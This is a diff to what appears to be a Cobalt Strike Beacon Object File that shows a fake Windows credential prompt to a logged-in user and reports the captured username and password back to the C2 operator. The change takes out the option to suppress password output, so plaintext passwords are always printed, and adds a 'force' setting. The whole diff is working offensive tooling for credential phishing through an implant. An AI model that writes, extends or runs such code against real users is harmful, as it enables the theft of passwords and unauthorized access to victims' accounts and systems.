@@ -54,10 +54,10 @@ void apply_packed_settings(const PackedArguments& packed, AppSettings* settings)
         settings->validate = normalize_bool(packed.ints[2]);
     }
     if (packed.int_count > 3) {
-        settings->include_password = normalize_bool(packed.ints[3]);
+        settings->persistent = normalize_bool(packed.ints[3]);
     }
     if (packed.int_count > 4) {
-        settings->persistent = normalize_bool(packed.ints[4]);
+        settings->force = normalize_bool(packed.ints[4]);
     }
 }
 
@@ -198,9 +198,9 @@ bool parse_raw_settings(
     storage->value.timeout_seconds = clamp_timeout_seconds(values[0]);
     storage->value.max_attempts = clamp_max_attempts(values[1]);
     storage->value.validate = normalize_bool(values[2]);
-    storage->value.include_password = normalize_bool(values[3]);
+    storage->value.persistent = normalize_bool(values[3]);
     if (number_count == 5) {
-        storage->value.persistent = normalize_bool(values[4]);
+        storage->value.force = normalize_bool(values[4]);
     }
     return true;
 }
@@ -259,13 +259,9 @@ void print_identity(const Credentials& credentials) {
     }
 }
 
-void print_credentials(const Credentials& credentials, bool include_password) {
+void print_credentials(const Credentials& credentials) {
     print_identity(credentials);
-    if (include_password) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Password: %ls\n", credentials.password);
-    } else {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Password output suppressed\n");
-    }
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Password: %ls\n", credentials.password);
 }
 
 // A C2 without the async API can leave the BeaconGetStopJobEvent import
@@ -318,7 +314,7 @@ void run(const char* data, int len, HANDLE stop_event) {
     if (!parse_settings(data, len, &storage)) {
         BeaconPrintf(
             CALLBACK_ERROR,
-            "[-] Invalid arguments; expected packed ZZiiiii or raw: [caption message] timeout attempts validate include-password [persistent]\n");
+            "[-] Invalid arguments; expected packed ZZiiiii or raw: [caption message] timeout attempts validate persistent [force]\n");
         return;
     }
     const AppSettings& settings = storage.value;
@@ -355,13 +351,14 @@ void run(const char* data, int len, HANDLE stop_event) {
 
     BeaconPrintf(
         CALLBACK_OUTPUT,
-        "[*] Starting async credential prompt for %ls (timeout=%u%s, attempts=%u, validation=%s, persistent=%s, session=%u, console-session=%u)\n",
+        "[*] Starting async credential prompt for %ls (timeout=%u%s, attempts=%u, validation=%s, persistent=%s, force=%s, session=%u, console-session=%u)\n",
         target.prompt_target,
         settings.timeout_seconds,
         settings.timeout_seconds == kNoTimeout ? " (none, stop the job to end it)" : "s",
         settings.max_attempts,
         settings.validate ? "on" : "off",
         settings.persistent ? "on" : "off",
+        settings.force ? "on" : "off",
         process_session,
         console_session);
 
@@ -415,7 +412,7 @@ void run(const char* data, int len, HANDLE stop_event) {
             result == PromptResult::validated
                 ? "[+] Credential validated\n"
                 : "[+] Credential captured without validation\n");
-        print_credentials(credentials, settings.include_password);
+        print_credentials(credentials);
         wakeup();
     } else if (result == PromptResult::stopped) {
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Credential prompt stopped by operator\n");
@@ -430,7 +427,7 @@ void run(const char* data, int len, HANDLE stop_event) {
             settings.max_attempts,
             error_code);
         if (credentials.username[0] != L'\0') {
-            print_credentials(credentials, settings.include_password);
+            print_credentials(credentials);
         }
     } else {
         BeaconPrintf(CALLBACK_ERROR, "[-] Credential prompt failed (error=%u)\n", error_code);
